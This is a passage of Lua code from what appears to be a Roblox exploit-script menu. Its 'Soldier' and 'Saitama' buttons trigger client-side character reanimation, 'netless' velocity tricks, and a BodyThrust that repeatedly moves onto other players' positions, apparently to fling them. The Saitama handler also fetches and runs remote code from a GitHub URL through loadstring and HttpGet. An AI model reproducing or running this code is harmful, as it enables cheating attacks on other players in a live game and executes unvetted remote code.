						SDown = false end
					if Key == Enum.KeyCode.D then
						DDown = false end
					if Key == Enum.KeyCode.Space then
						SpaceDown = false end end
				CONUP = game:GetService("UserInputService").InputEnded:Connect(KEYUP)

				local function MoveClone(X,Y,Z)
					LVecPart.CFrame = LVecPart.CFrame * CFrame.new(-X,Y,-Z)
					workspace["non"].Humanoid.WalkToPoint = LVecPart.Position
				end

				coroutine.wrap(function() 
					while true do game:GetService("RunService").RenderStepped:Wait()
						if HumanDied then break end
						if WDown then MoveClone(0,0,1e4) end
						if ADown then MoveClone(1e4,0,0) end
						if SDown then MoveClone(0,0,-1e4) end
						if DDown then MoveClone(-1e4,0,0) end
						if SpaceDown then CloneChar["Humanoid"].Jump = true end
						if WDown ~= true and ADown ~= true and SDown ~= true and DDown ~= true then
							workspace["non"].Humanoid.WalkToPoint = workspace["non"].HumanoidRootPart.Position end
					end 
				end)()

				local con
				function UnCollide()
					if HumanDied then con:Disconnect(); return end
					for _,Parts in next, CloneChar:GetDescendants() do
						if Parts:IsA("BasePart") then
							Parts.CanCollide = false 
						end 
					end
					for _,Parts in next, DeadChar:GetDescendants() do
						if Parts:IsA("BasePart") then
							Parts.CanCollide = false
						end 
					end 
				end
				con = game:GetService("RunService").Stepped:Connect(UnCollide)

				local resetBindable = Instance.new("BindableEvent")
				resetBindable.Event:connect(function()
					game:GetService("StarterGui"):SetCore("ResetButtonCallback", true)
					resetBindable:Destroy()
					CloneChar.Humanoid.Health = 0
				end)
				game:GetService("StarterGui"):SetCore("ResetButtonCallback", resetBindable)

				coroutine.wrap(function()
					while true do
						game:GetService("RunService").RenderStepped:wait()
						if not CloneChar or not CloneChar:FindFirstChild("Head") or not CloneChar:FindFirstChild("Humanoid") or CloneChar:FindFirstChild("Humanoid").Health <= 0 then 
							HumanDied = true
							pcall(function()
								game.Players.LocalPlayer.Character = CloneChar
								CloneChar:Destroy()
								game.Players.LocalPlayer.Character = DeadChar
								if resetBindable then
									game:GetService("StarterGui"):SetCore("ResetButtonCallback", true)
									resetBindable:Destroy()
								end
								DeadChar.Humanoid.Health = 0
							end)
							break
						end		
					end
				end)()

				for _,v in next, DeadChar:GetChildren() do
					if v:IsA("Accessory") then
						v:Clone().Parent = CloneChar
					end
				end

				SCIFIMOVIELOL(DeadChar["Head"],CloneChar["Head"],Vector3.new(0,0,0),Vector3.new(0,0,0))
				SCIFIMOVIELOL(DeadChar["UpperTorso"],CloneChar["Torso"],Vector3.new(0,0.2,0),Vector3.new(0,0,0))
				SCIFIMOVIELOL(DeadChar["LowerTorso"],CloneChar["Torso"],Vector3.new(0,-0.78,0),Vector3.new(0,0,0))
				SCIFIMOVIELOL(DeadChar["LeftUpperArm"],CloneChar["Left Arm"],Vector3.new(0,0.375,0),Vector3.new(0,0,0))
				SCIFIMOVIELOL(DeadChar["LeftLowerArm"],CloneChar["Left Arm"],Vector3.new(0,-0.215,0),Vector3.new(0,0,0))
				SCIFIMOVIELOL(DeadChar["LeftHand"],CloneChar["Left Arm"],Vector3.new(0,-0.825,0),Vector3.new(0,0,0))
				SCIFIMOVIELOL(DeadChar["RightUpperArm"],CloneChar["Right Arm"],Vector3.new(0,0.375,0),Vector3.new(0,0,0))
				SCIFIMOVIELOL(DeadChar["RightLowerArm"],CloneChar["Right Arm"],Vector3.new(0,-0.215,0),Vector3.new(0,0,0))
				SCIFIMOVIELOL(DeadChar["RightHand"],CloneChar["Right Arm"],Vector3.new(0,-0.825,0),Vector3.new(0,0,0))

				SCIFIMOVIELOL(DeadChar["LeftUpperLeg"],CloneChar["Left Leg"],Vector3.new(0,0.575,0),Vector3.new(0,0,0))
				SCIFIMOVIELOL(DeadChar["LeftLowerLeg"],CloneChar["Left Leg"],Vector3.new(0,-0.137,0),Vector3.new(0,0,0))
				SCIFIMOVIELOL(DeadChar["LeftFoot"],CloneChar["Left Leg"],Vector3.new(0,-0.787,0),Vector3.new(0,0,0))
				SCIFIMOVIELOL(DeadChar["RightUpperLeg"],CloneChar["Right Leg"],Vector3.new(0,0.575,0),Vector3.new(0,0,0))
				SCIFIMOVIELOL(DeadChar["RightLowerLeg"],CloneChar["Right Leg"],Vector3.new(0,-0.137,0),Vector3.new(0,0,0))
				SCIFIMOVIELOL(DeadChar["RightFoot"],CloneChar["Right Leg"],Vector3.new(0,-0.787,0),Vector3.new(0,0,0))

				SCIFIMOVIELOL(DeadChar["HumanoidRootPart"],CloneChar["HumanoidRootPart"],Vector3.new(0,0,0),Vector3.new(0,0,0))

				for _,v in next, DeadChar:GetChildren() do
					if v:IsA("Accessory") then
						SCIFIMOVIELOL(v.Handle,CloneChar[v.Name].Handle,Vector3.new(0,0,0),Vector3.new(0,0,0))
					end
				end

				for _,BodyParts in next, CloneChar:GetDescendants() do
					if BodyParts:IsA("BasePart") or BodyParts:IsA("Part") then
						BodyParts.Transparency = 1 end end
				if DeadChar.Head:FindFirstChild("Neck") then
					game.Players.LocalPlayer.Character:BreakJoints()
				end
			end
		end


	end



	local CloneChar = workspace.non
	game.Players.LocalPlayer.Character.Parent = CloneChar

	local MakeNewAnim = function(id)
		local NewAnim = Instance.new("Animation")
		NewAnim.AnimationId = id
		return {NewAnim,id}
	end

	function CreoFEFakeAnimations(Character)
		spawn(function()
			local Humanoid = Character:FindFirstChildWhichIsA("Humanoid")
			local HRP = Character:WaitForChild("HumanoidRootPart")


			local Walk = MakeNewAnim("http://www.roblox.com/asset/?id=180426354")
			local Idle = MakeNewAnim("http://www.roblox.com/asset/?id=180435571")
			local Jump = MakeNewAnim("http://www.roblox.com/asset/?id=125750702")
			local Fall = MakeNewAnim("http://www.roblox.com/asset/?id=180436148")

			local anim = Idle[1]
			local AnimId = Idle[2]
			local Anim = Humanoid:LoadAnimation(anim)
			Anim.Priority = Enum.AnimationPriority.Core

			local rayCast = function(Pos, Dir, Max, Ignore)

				return game:service("Workspace"):FindPartOnRay(Ray.new(Pos, Dir.unit * (Max or 999.999)), (Ignore))
			end



			spawn(function()
				while HumanDied ~= true do
					wait()
					local hitfloor = rayCast(HRP.Position, CFrame.new(HRP.Position, HRP.Position - Vector3.new(0, 1, 0)).lookVector, 4, Character)
					local oldAnim = Anim
					local oldAnimId = AnimId
					if HRP.Velocity.Y > 0 and hitfloor == nil then
						Anim = Humanoid:LoadAnimation(Jump[1])
						AnimId = Jump[2]
					elseif HRP.Velocity.Y < 0 and hitfloor == nil then
						Anim = Humanoid:LoadAnimation(Fall[1])
						AnimId = Fall[2]
					elseif (HRP.Velocity.X + HRP.Velocity.Z)/2 > 0.1 or (HRP.Velocity.X + HRP.Velocity.Z)/2 < -0.1 then
						Anim = Humanoid:LoadAnimation(Walk[1])
						AnimId = Walk[2]
					else
						Anim = Humanoid:LoadAnimation(Idle[1])
						AnimId = Idle[2]
					end
					if AnimId ~= oldAnimId then
						oldAnim:Stop()
						Anim:Play()
					end

				end
			end)
		end)

	end





	CreoFEFakeAnimations(CloneChar)
	CreoFEFakeAnimations(FakeCharacter)






	s = game:GetService("RunService").Heartbeat:connect(function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0,35,0)
	end)
	task.spawn(function()
		while true do
			wait()
			if HumanDied == true then
				s:Disconnect()
				break
			end
		end
	end)







	local SHOW = Instance.new("SelectionBox",workspace)
	SHOW.Adornee = game.Players.LocalPlayer.Character.HumanoidRootPart
	--- <<Start Soldier>> --



	bambam = Instance.new("BodyThrust")
	bambam.Parent = HumanRoot
	bambam.Force = Vector3.new(0,0,0)
	------Body Variables------
	local myHuman = FakeCharacter.Humanoid
	local myTorso = FakeCharacter.Torso
	local myHead = FakeCharacter.Head
	local myFace = myHead.face
	local neck = myTorso.Neck
	local headWeld = myTorso["Head Weld"]
	local rArm = FakeCharacter["Right Arm"]
	local lArm = FakeCharacter["Left Arm"]
	local lShoulder = myTorso["Left Shoulder"]
	local rShoulder = myTorso["Right Shoulder"]
	local lArmWeld = myTorso["Left Arm Weld"]
	local rArmWeld = myTorso["Right Arm Weld"]
	local gyro = FakeCharacter.HumanoidRootPart.BodyGyro

	------M4 Variables------
	local m4 = FakeCharacter.M4
	if GunHat then
		GunHat.Parent = FakeCharacter
	end
	if SoldierHelm then
		SoldierHelm.Parent = FakeCharacter
		FakeCharacter.Mask.Transparency = 1
		FakeLimbs["Head"].Transparency = 1
		FakeCharacter.fasthelmet.Transparency = 1
	end


	local m4Weld = m4["M4 Weld"]
	local barrel = FakeCharacter.Barrel
	local aimer = FakeCharacter.Aimer
	local aimerWeld = aimer["Aimer Weld"]
	local fullMag = 30
	local mag = fullMag
	local flash = barrel.Attachment.Flash

	------Knife variables------
	local knife = FakeCharacter.Knife
	local knifeWeld = knife["Knife Weld"]

	------Grenade variables------
	local grenade = FakeCharacter.Grenade

	------Sounds------
	local equipSound = m4.Equip
	local fireSound = m4.Fire
	local reloadSound = m4.Reload
	local knifeEquipSound = knife.EquipSound
	local knifeAttackSound = knife.AttackSound
	local knifeStabSound = knife.StabSound
	local hurtSound = myHead.Hurt
	local pinSound = grenade.Pin

	------Animations------
	local stabAnimation = myHuman:LoadAnimation(FakeCharacter.Stab)
	stabAnimation.Priority = Enum.AnimationPriority.Action
	local throwAnimation = myHuman:LoadAnimation(FakeCharacter.ThrowAnimation)
	throwAnimation.Priority = Enum.AnimationPriority.Action
	throwAnimation.Looped = false
	local reloadAnimation = myHuman:LoadAnimation(FakeCharacter.Reload)
	reloadAnimation.Priority = Enum.AnimationPriority.Action

	------Status------
	local reloading = false
	local weaponAimed = false
	local weaponCool = true
	local m4Equipped = false
	local knifeEquipped = false
	local grenadeCool = true
	local currentTarget = nil

	local status = "Idle"
	spawn(function()
		while  true do
			wait()
			if currentTarget == nil or weaponCool == false then
				HumanRoot.Position = FakeCharacter.Torso.Position
				bambam.Force = Vector3.new(0,0,0)
			end
		end
	end)
	local faces = {Idle = "http://www.roblox.com/asset/?id=23219775", 
		Attacking = "http://www.roblox.com/asset/?id=286688505", 
		Hunting = "http://www.roblox.com/asset/?id=209715003 ", 
		Hurt = "http://www.roblox.com/asset/?id=258192246",
		Dead = "http://www.roblox.com/asset/?id=15426038"}
	local gunPointedAt = nil

	------Target/Ally Tracking------
	local allies = {"Civilian"}
	local potentialTargets = {}
	local activeAllies = {}
	local team = FakeCharacter.Settings.Team.Value
	local attackPlayers = FakeCharacter.Settings.AttackPlayers.Value

	function spawner(func,...)
		local co = coroutine.wrap(func)
		co(...)
	end

	function checkDist(part1,part2)
		return (part1.Position - part2.Position).Magnitude
	end

	function checkSight(target)
		local ray = Ray.new(barrel.Position, (target.Position - barrel.Position).Unit * 75)
		local part,position = workspace:FindPartOnRayWithIgnoreList(ray, {FakeCharacter})
		local ray2 = Ray.new(myTorso.Position, (target.Position - myTorso.Position).Unit * 75)
		local part2,position2 = workspace:FindPartOnRayWithIgnoreList(ray2, {FakeCharacter})
		if part and part2 then
			if part:IsDescendantOf(target.Parent) and part2:IsDescendantOf(target.Parent) then
				return true
			end
		end
		return false
	end

	function updateFace()
		if myFace.Texture ~= faces.Dead and myFace.Texture ~= faces.Hurt then
			myFace.Texture = faces[status]
		end
	end

	function findTarget()
		local dist = FakeCharacter.Settings.DetectionRange.Value
		local target = nil
		potentialTargets = {}
		local seeTargets = {}
		for _,v in ipairs(workspace:GetChildren()) do

			local human = v:FindFirstChild("Humanoid")
			local torso = v:FindFirstChild("HumanoidRootPart") or v:FindFirstChild("Torso")
			if human and torso and v ~= FakeCharacter and v ~= CloneChar then

				--Check and see if they are on our team, if they are break the loop.
				local targetTeam
				local teammate = false
				if v:FindFirstChild("Team") then
					targetTeam = v.Team.Value
				elseif v:FindFirstChild("Settings") and v.Settings:FindFirstChild("Team") then
					targetTeam = v.Settings.Team.Value			
				end
				if (targetTeam and targetTeam == team) or (not attackPlayers and game.Players:GetPlayerFromCharacter(v)) then
					teammate = true
				end

				if (myTorso.Position - torso.Position).magnitude < dist and human.Health > 0 then
					for i,x in ipairs(allies) do
						if x == v.Name or teammate then
							table.insert(activeAllies,torso)
							break
						elseif i == #allies then
							table.insert(potentialTargets,torso)
						end
					end
				end
			end
		end
		if #potentialTargets > 0 then
			for i,v in ipairs(potentialTargets) do
				if checkSight(v) then
					table.insert(seeTargets,v)
				end
			end
			if #seeTargets > 0 then
				for i,v in ipairs(seeTargets) do
					if (myTorso.Position - v.Position).magnitude < dist then
						target = v
						dist = (myTorso.Position - v.Position).magnitude
					end
				end
			else
				for i,v in ipairs(potentialTargets) do
					if (myTorso.Position - v.Position).magnitude < dist then
						target = v
						dist = (myTorso.Position - v.Position).magnitude
					end
				end
			end
		end
		currentTarget = target 
	end

	function pathToLocation(target)
		local path = game:GetService("PathfindingService"):CreatePath()
		path:ComputeAsync(myTorso.Position, target.Position)
		local waypoints = path:GetWaypoints()

		for _,waypoint in ipairs(waypoints) do
			if waypoint.Action == Enum.PathWaypointAction.Jump then
				myHuman.Jump = true
			end
			myHuman:MoveTo(waypoint.Position)
			spawner(function()
				wait(0.5)
				if myHuman.WalkToPoint.Y > myTorso.Position.Y then
					myHuman.Jump = true
				end
			end)
			local moveSuccess = myHuman.MoveToFinished:Wait()
			if not moveSuccess or not target.Parent or (checkDist(myTorso,target) < 30 and checkSight(target)) or currentTarget ~= target then
				break
			end
			if checkDist(target,waypoints[#waypoints]) > 30 then
				pathToLocation(target)
			end
		end
	end

	function walkRandom()
		local randX = math.random(-100,100)
		local randZ = math.random(-100,100)
		local goal = myTorso.Position + Vector3.new(randX, 0, randZ)
		local path = game:GetService("PathfindingService"):CreatePath()
		path:ComputeAsync(myTorso.Position, goal)
		local waypoints = path:GetWaypoints()

		if path.Status == Enum.PathStatus.Success then
			for i,waypoint in ipairs(waypoints) do
				if waypoint.Action == Enum.PathWaypointAction.Jump then
					myHuman.Jump = true
				end
				myHuman:MoveTo(waypoint.Position)
				spawner(function()
					wait(0.5)
					if myHuman.WalkToPoint.Y > myTorso.Position.Y then
						myHuman.Jump = true
					end
				end)
				local moveSuccess = myHuman.MoveToFinished:Wait()
				if not moveSuccess or currentTarget then
					break
				end
			end
		else
			wait(2)
		end
	end

	function drawM4()
		yieldKnife()
		if m4Equipped == false then
			m4Equipped = true
			equipSound:Play()

			--Right Arm Setup
			rShoulder.Part1 = nil
			rArm.CFrame = aimer.CFrame * CFrame.new(1.25,0.05,-0.65) * CFrame.Angles(math.rad(80),math.rad(0),math.rad(-10))
			rArmWeld.Part1 = rArm

			--Left Arm Setup 
			lShoulder.Part1 = nil
			lArm.CFrame = aimer.CFrame * CFrame.new(-0.35,0.05,-1.48) * CFrame.Angles(math.rad(84),math.rad(-3),math.rad(28))
			lArmWeld.Part1 = lArm

			--M4 Setup
			m4Weld.Part0 = nil
			m4.CFrame = aimer.CFrame * CFrame.new(0.65,0.37,-2.22) * CFrame.Angles(math.rad(-90),math.rad(0),math.rad(0))
			m4Weld.Part0 = aimer
		end
	end

	function yieldM4()
		myHuman.AutoRotate = true 
		gyro.MaxTorque = Vector3.new(0,0,0)
		if weaponAimed == true then
			weaponAimed = false
			resetHead()
		end
		if m4Equipped == true then
			m4Equipped = false
			equipSound:Play()

			--Right Arm setup
			rArmWeld.Part1 = nil
			rShoulder.Part1 = rArm

			--Left Arm Setup
			lArmWeld.Part1 = nil
			lShoulder.Part1 = lArm

			--M4 Setup
			m4Weld.Part0 = nil
			m4.CFrame = myTorso.CFrame * CFrame.new(0,0,0.6) * CFrame.Angles(math.rad(-90),math.rad(-60),math.rad(90))
			m4Weld.Part0 = myTorso
		end
	end

	function drawKnife()
		if knifeEquipped == false then
			yieldM4()
			knifeEquipSound:Play()
			knifeEquipped = true
			knifeWeld.Part0 = nil
			knife.CFrame = rArm.CFrame * CFrame.new(0,-1,-1) * CFrame.Angles(math.rad(90),math.rad(180),math.rad(180))
			knifeWeld.Part0 = rArm
		end
	end

	function yieldKnife()
		if knifeEquipped == true then
			knifeEquipped = false
			knifeWeld.Part0 = nil
			knife.CFrame = myTorso.CFrame * CFrame.new(-1,-1,0.5) * CFrame.Angles(math.rad(-65),0,math.rad(180))
			knifeWeld.Part0 = myTorso
		end
	end

	function aim(target)
		if weaponAimed == false then
			game:GetService("TweenService"):Create(neck,TweenInfo.new(0.5),{C0 = neck.C0 * CFrame.Angles(0,math.rad(-15),0)}):Play()
		end

		myHuman.AutoRotate = false

		weaponAimed = true

		gyro.CFrame = CFrame.new(myTorso.Position,target.Position)
		gyro.MaxTorque = Vector3.new(0,math.huge,0)
		if not reloading then

			local aimCFrame = CFrame.new(aimer.Position,target.Position)
			aimCFrame = aimCFrame - aimCFrame.Position
			local negateCFrame = myTorso.CFrame - myTorso.Position
			local newC0 = CFrame.new(0,0.5,0) * negateCFrame:Inverse() * aimCFrame
			local x,y,z = newC0:ToEulerAnglesXYZ()
			x = math.clamp(x,-0.8,0.8) --So his aiming isn't crazy backwards
			newC0 = CFrame.new(0,0.5,0) * CFrame.fromEulerAnglesXYZ(x,0,0)
			local lookDiff = (newC0.LookVector - aimerWeld.C0.LookVector).Magnitude 
			game:GetService("TweenService"):Create(aimerWeld,TweenInfo.new(lookDiff * 0.2),{C0 = newC0}):Play()


			local newC0 = CFrame.new(0,1,0) * CFrame.Angles(-1.5 + math.rad(aimer.Orientation.X),math.rad(15),math.rad(180)) ---1.5 - 
			game:GetService("TweenService"):Create(neck,TweenInfo.new(lookDiff * 0.2),{C0 = newC0}):Play()
			wait(lookDiff*0.2)
		end
	end


	function resetHead()
		game:GetService("TweenService"):Create(neck,TweenInfo.new(0.5),{C0 = CFrame.new(0,1,0) * CFrame.Angles(math.rad(-90),0,math.rad(180))}):Play()
	end

	function shoot(target)
		if weaponCool == true and reloading == false then
			weaponCool = false

			local shot
			if checkDist(target,myTorso) > 60 then
				shot = 1
			else
				shot = 3
			end
			for i = 1, shot do
				wait(0.1)
				mag = mag - 1 

				flash:Emit(1)
				local flash = Instance.new("PointLight",barrel)
				flash.Brightness = 3
				game:GetService("Debris"):AddItem(flash,0.1)

				local bullet = Instance.new("Part")
				bullet.Size = Vector3.new(0.1,0.1,0.3)
				bullet.BrickColor = BrickColor.new("Gold")
				bullet.Material = Enum.Material.Neon
				bullet.CFrame = barrel.CFrame
				bullet.CanCollide = false
				bullet.Touched:Connect(function(obj)
					if not obj:IsDescendantOf(FakeCharacter) then 
						local human = obj.Parent:FindFirstChild("Humanoid")
						if human then
							for i = 1,30 do
								wait()
								HumanRoot.Position = obj.Parent:WaitForChild("HumanoidRootPart").Position
								bambam.Location = obj.Parent:WaitForChild("HumanoidRootPart").Position
								bambam.Force = Vector3.new(1000,0,1000)
								findTarget()
							end
						end
						bullet:Destroy()
					end
				end)
				bullet.Parent = workspace
				fireSound:Play()

				local spread = Vector3.new(math.random(-shot,shot)/100,math.random(-shot,shot)/100,math.random(-shot,shot)/100)

				local bv = Instance.new("BodyVelocity",bullet)
				bv.MaxForce = Vector3.new(math.huge,math.huge,math.huge)
				bv.Velocity = (aimer.CFrame.LookVector + spread) * 300

				local s = Instance.new("Sound",bullet)
				s.Volume = 0.7
				s.PlaybackSpeed = 7
				s.Looped = true
				s.SoundId = "rbxasset://sounds/Rocket whoosh 01.wav"
				s:Play()

				local a1 = Instance.new("Attachment",bullet)
				a1.Position = Vector3.new(0,0.05,0)
				local a2 = Instance.new("Attachment",bullet)
				a2.Position = Vector3.new(0,-0.05,0)

				local t = Instance.new("Trail",bullet)
				t.Attachment0 = a1
				t.Attachment1 = a2
				t.Color = ColorSequence.new(bullet.Color)
				t.WidthScale = NumberSequence.new(0.1,0.01)
				t.Lifetime = 0.3

				--TODO ADD KICK

				game:GetService("Debris"):AddItem(bullet, 5)
			end

			if mag <= 0 then
				reload()
			end

			spawner(function()
				wait(1)
				weaponCool = true
			end)
		end
	end


	function reload()
		if weaponAimed == true then
			resetHead()
			weaponAimed = false
		end
		reloadSound:Play()
		reloading = true

		yieldM4()
		m4Weld.Part0 = nil
		m4.CFrame = lArm.CFrame * CFrame.new(0.6,-1.3,0.2) * CFrame.Angles(math.rad(180),0,0)
		m4Weld.Part0 = lArm

		reloadAnimation:Play()
		reloadAnimation:AdjustSpeed(3)
		reloadAnimation.Stopped:Wait()
		reloading = false 
		mag = fullMag
		drawM4()
	end

	function stab(target)
		if weaponCool == true then
			weaponCool = false

			knifeStabSound:Play()
			knifeAttackSound:Play()
			stabAnimation:Play()
			local human = target.Parent.Humanoid
			HumanRoot.Position = target.Parent:WaitForChild("HumanoidRootPart").Position
			bambam.Location = target.Parent:WaitForChild("HumanoidRootPart").Position
			bambam.Force = Vector3.new(500,0,500)

			spawner(function()
				wait(0.5)
				weaponCool = true
			end)
		end
	end

	function yieldWeapons()
		yieldKnife()
		yieldM4()
		if weaponAimed == true then
			weaponAimed = false 
			resetHead()
		end
	end

	function checkCluster(target)
		--Check for nearby allies
		for i,v in ipairs(activeAllies) do
			if checkDist(target,v) < 30 then
				return false
			end
		end
		--Check if enemies are paired close together
		for i,v in ipairs(potentialTargets) do
			if v ~= target then
				if checkDist(target,v) < 15 then
					return true
				end
			end
		end
		return false
	end

	function throwGrenade(target)
		if weaponCool == true and grenadeCool == true then
			weaponCool = false
			grenadeCool = false
			yieldWeapons()
			local g = grenade:Clone()
			g.Boom.PlayOnRemove = true
			g.Parent = workspace
			g.CanCollide = true
			g.CFrame = rArm.CFrame * CFrame.new(0,-1.3,0) * CFrame.Angles(0,0,math.rad(90))
			game:GetService("Debris"):AddItem(g,5)

			grenade.Transparency = 1

			local w = Instance.new("WeldConstraint",g)
			w.Part0 = rArm
			w.Part1 = g

			throwAnimation:Play()
			pinSound:Play()

			aim(target)


			wait(0.4)

			if myHuman.Health <= 0 then
				return
			end

			aim(target)

			throwAnimation:Stop()

			w.Part1 = nil
			local dist = checkDist(myTorso,target)
			g.Velocity = (myTorso.CFrame.LookVector + Vector3.new(0,1,0)) * Vector3.new(dist,dist*1.5,dist)

			--Wait until grenade is thrown before it can be primed
			touched = g.Touched:Connect(function(obj)
				if not obj:IsDescendantOf(FakeCharacter) then
					touched:Disconnect()
					g.Pin:Play()
					wait(0.5)
					local x = Instance.new("Explosion",workspace)
					x.Position = g.Position
					x.Hit:Connect(function(obj,dist)
						local human = obj.Parent:FindFirstChild("Humanoid")
						if human then
							human:TakeDamage(20 - dist)
							human:ChangeState(Enum.HumanoidStateType.Ragdoll)
						end
					end)
					g:Destroy()
					game:GetService("Debris"):AddItem(x,2)
				end
			end)

			local attach0 = g.Attach0
			local attach1 = g.Attach1
			local t = Instance.new("Trail",g)
			t.Attachment0 = attach0
			t.Attachment1 = attach1
			t.Lifetime = 0.5
			t.Color = ColorSequence.new(Color3.fromRGB(150,150,150))
			t.WidthScale = NumberSequence.new(1,0)

			spawner(function()
				wait(1)
				weaponCool = true
				wait(5)
				grenadeCool = true
				grenade.Transparency = 0
			end)
		end
	end

	function movementLoop()
		while myHuman.Health>0 do
			if currentTarget then
				if checkDist(currentTarget,myTorso) > 30 or not checkSight(currentTarget) then
					pathToLocation(currentTarget)
				elseif checkDist(currentTarget,myTorso) > 8 then
					if math.random(0,1) == 1 then
						myHuman:Move(myTorso.CFrame.RightVector)
					else
						myHuman:Move(-myTorso.CFrame.RightVector)
					end
					wait(0.5)
				end
			else
				local randomAction = math.random(4)
				if randomAction == 3 then
					walkRandom()
				elseif randomAction == 2 then
					--print("Look randomly")
				end
				wait(3)
			end
			wait(0.1)
		end
	end

	function searchTargetLoop()
		while myHuman.Health>0 do
			findTarget()
			wait(3)
		end
	end

	function aimingLoop()
		while myHuman.Health>0 do
			if currentTarget then
				if checkSight(currentTarget) then
					aim(currentTarget)
					gunPointedAt = currentTarget
				else
					wait(0.5)
				end
			else
				wait(2)
			end
			wait()
		end
	end

	function attackLoop()
		while myHuman.Health>0 do
			if currentTarget then
				status = "Hunting"
				updateFace()
				if checkSight(currentTarget) then
					status = "Attacking"
					updateFace()
					local distance = checkDist(myTorso,currentTarget)
					if distance > 15 then
						if checkCluster(currentTarget) == true and distance < 100 and distance > 30 and grenadeCool then
							throwGrenade(currentTarget)
						else
							drawM4()
							repeat 
								wait()
							until gunPointedAt == currentTarget
							shoot(currentTarget)
						end
					else
						drawKnife()
						myHuman:MoveTo(currentTarget.Position)
						local canStab = false
						for i,v in pairs(currentTarget.Parent:GetChildren()) do
							if v:IsA("BasePart") and checkDist(v,myTorso) < 7 then
								canStab = true
							end
						end
						if canStab then
							stab(currentTarget)
						end
					end
				else
					if weaponAimed == true then
						weaponAimed = false
						myHuman.AutoRotate = true
						gyro.MaxTorque = Vector3.new(0,0,0)
						resetHead()
						local newC0 = CFrame.new(0,0.5,0) * CFrame.Angles(-0.5,0,0)
						local lookDiff = (newC0.LookVector - aimerWeld.C0.LookVector).Magnitude 
						game:GetService("TweenService"):Create(aimerWeld,TweenInfo.new(lookDiff * 0.2),{C0 = newC0}):Play()
					end
				end
			else
				status = "Idle"
				updateFace()
				yieldWeapons()
				wait(2)
			end
			wait(0.1)
		end
	end

	function Died()
		FakeCharacter:Destroy()
		CloneChar:Destroy()
		game.Players.LocalPlayer.Character:Destroy()
	end

	myHuman.Died:Connect(Died)

	local oldHealth = myHuman.Health
	local soundSpeeds = {0.9,0.95,1,1.05,1.1}
	myHuman.HealthChanged:Connect(function(health)
		if health < oldHealth and hurtSound.IsPlaying == false then
			hurtSound.PlaybackSpeed = soundSpeeds[math.random(#soundSpeeds)]
			hurtSound:Play()
			spawner(function()
				myFace.Texture = faces.Hurt
				wait(1)
				if myFace.Texture == faces.Hurt then
					myFace.Texture = faces[status]
				end
			end)
		end
		oldHealth = health
	end)

	spawner(searchTargetLoop)
	spawner(attackLoop)
	spawner(movementLoop)
	spawner(aimingLoop)
end)
UICorner_29.Parent = Soldier

Saitama.Name = "Saitama"
Saitama.Parent = FlingScriptsFrame
Saitama.BackgroundColor3 = Color3.fromRGB(45, 70, 88)
Saitama.Position = UDim2.new(0.0492126346, 0, 0.314039648, 0)
Saitama.Size = UDim2.new(0, 143, 0, 43)
Saitama.Font = Enum.Font.Nunito
Saitama.Text = "Saitama"
Saitama.TextColor3 = Color3.fromRGB(238, 238, 238)
Saitama.TextSize = 32.000
Saitama.MouseButton1Click:Connect(function()
	print('Saitama Made by mugaga#2801')
	--Saitama
	--Made by mugaga#2801
	--For The Script To Execute You Need:
	--https://web.roblox.com/catalog/6470135113/Fan-Hand-Sign-Why-Dont-We-WDW
	--R - Main Idle
	--E - Barrage
	--Click - Punch
	for i,v in next, game:GetService("Players").LocalPlayer.Character:GetDescendants() do
		if v:IsA("BasePart") and v.Name ~="HumanoidRootPart" then 
			game:GetService("RunService").Heartbeat:connect(function()
				v.Velocity = Vector3.new(0,35,0)
				wait(0.5)
			end)
		end
	end

	game:GetService("StarterGui"):SetCore("SendNotification", { 
		Title = "Notification";
		Text = "Netless activated";
		Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150"})
	Duration = 16;
	local HatChar = game.Players.LocalPlayer.Character
	local Hat = HatChar:FindFirstChild("WDW_FoamFinger")

	Hat.Handle.SpecialMesh:Destroy()




	HumanDied = false
	local reanim
	function noplsmesh(hat)
		_G.OldCF=workspace.Camera.CFrame
		oldchar=game.Players.LocalPlayer.Character
		game.Players.LocalPlayer.Character=workspace[game.Players.LocalPlayer.Name]
		for i,v in next, workspace[game.Players.LocalPlayer.Name][hat]:GetDescendants() do
			if v:IsA('Mesh') or v:IsA('SpecialMesh') then
				v:Remove()
			end
		end
		game.Players.LocalPlayer.Character=oldchar
		wait()
		workspace.Camera.CFrame=_G.OldCF
		game.Players.LocalPlayer.Character=oldchar
	end
	_G.ClickFling=false -- Set this to true if u want.
	loadstring(game:HttpGet(('https://raw.githubusercontent.com/OofHead-FE/nexo-before-deleted/main/NexoPD'),true))()

	IT = Instance.new
	CF = CFrame.new
	VT = Vector3.new
	RAD = math.rad
	C3 = Color3.new
	UD2 = UDim2.new
	BRICKC = BrickColor.new
	ANGLES = CFrame.Angles
	EULER = CFrame.fromEulerAnglesXYZ
	COS = math.cos
	ACOS = math.acos
	SIN = math.sin
	ASIN = math.asin
	ABS = math.abs
	MRANDOM = math.random
	FLOOR = math.floor

	speed = 1
	sine = 1
	srv = game:GetService('RunService')

	function hatset(yes,part,c1,c0,nm)
		reanim[yes].Handle.AccessoryWeld.Part1=reanim[part]
		reanim[yes].Handle.AccessoryWeld.C1=c1 or CFrame.new()
		reanim[yes].Handle.AccessoryWeld.C0=c0 or CFrame.new()--3bbb322dad5929d0d4f25adcebf30aa5
		if nm==true then
			noplsmesh(yes)
		end
	end

	--put the hat script converted below

	reanim = game.Players.LocalPlayer.Character.CWExtra.NexoPD
	RJ = reanim.HumanoidRootPart.RootJoint
	RS = reanim.Torso['Right Shoulder']
	LS = reanim.Torso['Left Shoulder']
	RH = reanim.Torso['Right Hip']
	LH = reanim.Torso['Left Hip']
	Root = reanim.HumanoidRootPart
	NECK = reanim.Torso.Neck
	NECK.C0 = CF(0,1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
	NECK.C1 = CF(0,-0.5,0)*ANGLES(RAD(0),RAD(0),RAD(0))
	RJ.C1 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
	RJ.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
	RS.C1 = CF(-0.5,0.5,0)*ANGLES(RAD(0),RAD(0),RAD(0))
	LS.C1 = CF(0.5,0.5,0)*ANGLES(RAD(0),RAD(0),RAD(0))
	RH.C1 = CF(0,1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
	LH.C1 = CF(0,1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
	RH.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
